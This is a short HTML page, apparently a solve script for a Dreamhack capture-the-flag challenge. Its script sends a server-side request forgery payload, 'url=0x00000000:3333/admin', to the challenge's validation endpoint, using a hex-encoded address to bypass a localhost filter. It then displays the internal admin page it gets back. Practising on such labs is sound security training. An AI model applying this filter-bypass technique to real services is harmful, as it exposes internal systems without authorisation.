<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <h1>
        <div id="result-box"></div>
    </h1>
    <script>
        fetch("http://host3.dreamhack.games:14995/validation?url=0x00000000:3333/admin", {
            method: 'GET',
            'refer': '192.168.0.1'
        }).then(response => {
            if (!response.ok) {
                throw new Error("네트워크 응답 실패");
            }
            return response.text()
        }).then(htmlString => {
            const parser = new DOMParser();
            const doc = parser.parseFromString(htmlString, 'text/html');

            const targetElement = doc.querySelector('#result-box');

            if (targetElement) {
                const resValue = targetElement.textContent;
                console.log(resValue);

                document.getElementById("result-box").textContent = resValue;
            } else {
                document.getElementById("result-box").textContent = htmlString;
                console.log(htmlString)
            }
        })
    </script>
</body>
</html>
